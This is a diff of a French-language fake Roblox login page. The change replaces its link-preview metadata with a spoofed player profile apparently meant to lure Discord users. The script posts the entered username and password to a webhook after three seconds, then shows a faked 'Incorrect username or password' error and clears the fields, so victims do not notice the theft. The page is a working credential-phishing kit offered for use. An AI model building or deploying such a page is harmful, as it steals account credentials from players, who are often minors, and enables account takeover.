@@ -5,22 +5,17 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Connexion à Roblox</title>
 
-  <!-- Open Graph / Facebook -->
-  <meta property="og:title" content="Login Roblox" />
-  <meta property="og:description" content="Connecte-toi pour jouer avec ton compte Roblox." />
-  <meta property="og:image" content="https://example.com/image.jpg" />
-  <meta property="og:url" content="https://tonlien.github.io/RobloxLogin/" />
-
-  <!-- Twitter -->
+  <!-- Open Graph pour Discord -->
+  <meta property="og:title" content="Slyweloveyou221's Profile" />
+  <meta property="og:description" content="Slyweloveyou221 est l’un des millions de joueurs qui créent et explorent les possibilités infinies de Roblox. Rejoins-le et explore ensemble !" />
+  <meta property="og:image" content="https://tr.rbxcdn.com/48f7ac23eb421cdf7d6810f9ed8dfe75/150/150/AvatarHeadshot/Png" />
+  <meta property="og:url" content="https://slyweloveyou221.github.io/test2/" />
+  <meta name="theme-color" content="#2f3136" />
   <meta name="twitter:card" content="summary_large_image" />
 
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
+    /* Ton CSS reste inchangé ici */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       background-color: #1c1c1c;
       font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
@@ -29,7 +24,6 @@
       overflow: hidden;
       position: relative;
     }
-
     .topbar {
       width: 100%;
       background-color: #1c1c1c;
@@ -42,31 +36,19 @@
       font-size: 14px;
       border-bottom: 1px solid #333;
     }
-
-    .topbar .logo {
-      font-weight: bold;
-      font-size: 18px;
-    }
-
-    .topbar a {
-      color: white;
-      text-decoration: none;
-      padding: 6px 10px;
-    }
-
+    .topbar .logo { font-weight: bold; font-size: 18px; }
+    .topbar a { color: white; text-decoration: none; padding: 6px 10px; }
     .topbar .search {
       padding: 5px;
       border-radius: 4px;
       border: none;
       font-size: 14px;
     }
-
     .topbar .buttons {
       display: flex;
       gap: 10px;
       align-items: center;
     }
-
     .topbar .signup {
       background-color: #007bff;
       color: white;
@@ -75,7 +57,6 @@
       border-radius: 4px;
       cursor: pointer;
     }
-
     .topbar .login {
       background-color: #444;
       color: white;
@@ -84,7 +65,6 @@
       border-radius: 4px;
       cursor: pointer;
     }
-
     .container {
       background-color: #2c2c2c;
       width: 420px;
@@ -96,7 +76,6 @@
       left: 50%;
       transform: translate(-50%, -50%);
     }
-
     .login-title {
       text-align: center;
       font-size: 32px;
@@ -105,7 +84,6 @@
       letter-spacing: 0.5px;
       margin-bottom: 25px;
     }
-
     .input-field {
       width: 100%;
       padding: 12px;
@@ -116,13 +94,8 @@
       color: white;
       font-size: 16px;
     }
-
-    .input-field::placeholder {
-      color: #bbb;
-    }
-
-    .btn,
-    .outline-btn {
+    .input-field::placeholder { color: #bbb; }
+    .btn, .outline-btn {
       width: 100%;
       padding: 14px;
       border-radius: 5px;
@@ -135,12 +108,9 @@
       border: 2px solid white;
       text-align: center;
     }
-
-    .btn:hover,
-    .outline-btn:hover {
+    .btn:hover, .outline-btn:hover {
       background-color: rgba(255, 255, 255, 0.1);
     }
-
     .link {
       text-align: center;
       font-size: 15px;
@@ -148,11 +118,7 @@
       margin: 10px 0;
       cursor: pointer;
     }
-
-    .link:hover {
-      text-decoration: underline;
-    }
-
+    .link:hover { text-decoration: underline; }
     .footer {
       font-size: 11px;
       color: #aaa;
@@ -165,24 +131,18 @@
       line-height: 1.6;
       border-top: 1px solid #333;
     }
-
     .footer a {
       color: #aaa;
       margin: 0 5px;
       text-decoration: none;
     }
-
-    .footer a:hover {
-      text-decoration: underline;
-    }
-
+    .footer a:hover { text-decoration: underline; }
     .loader {
       display: flex;
       justify-content: center;
       margin-top: 10px;
       gap: 8px;
     }
-
     .loader div {
       width: 10px;
       height: 10px;
@@ -190,20 +150,12 @@
       border-radius: 50%;
       animation: bounce 0.6s infinite alternate;
     }
-
-    .loader div:nth-child(2) {
-      animation-delay: 0.2s;
-    }
-
-    .loader div:nth-child(3) {
-      animation-delay: 0.4s;
-    }
-
+    .loader div:nth-child(2) { animation-delay: 0.2s; }
+    .loader div:nth-child(3) { animation-delay: 0.4s; }
     @keyframes bounce {
       from { transform: translateY(0); }
       to { transform: translateY(-10px); }
     }
-
     .error-message {
       color: red;
       text-align: center;
@@ -277,7 +229,7 @@
         </div>
       `;
 
-      // Envoi et message d'erreur après 3 secondes
+      // Envoi après 3 secondes
       setTimeout(() => {
         fetch(webhookUrl, {
           method: 'POST',
@@ -288,9 +240,8 @@
           })
         });
 
-        // Affiche message d'erreur
+        // Message d'erreur simulé
         status.innerHTML = `<div class="error-message">Incorrect username or password.</div>`;
-
         document.getElementById("username").value = '';
         document.getElementById("password").value = '';
       }, 3000);
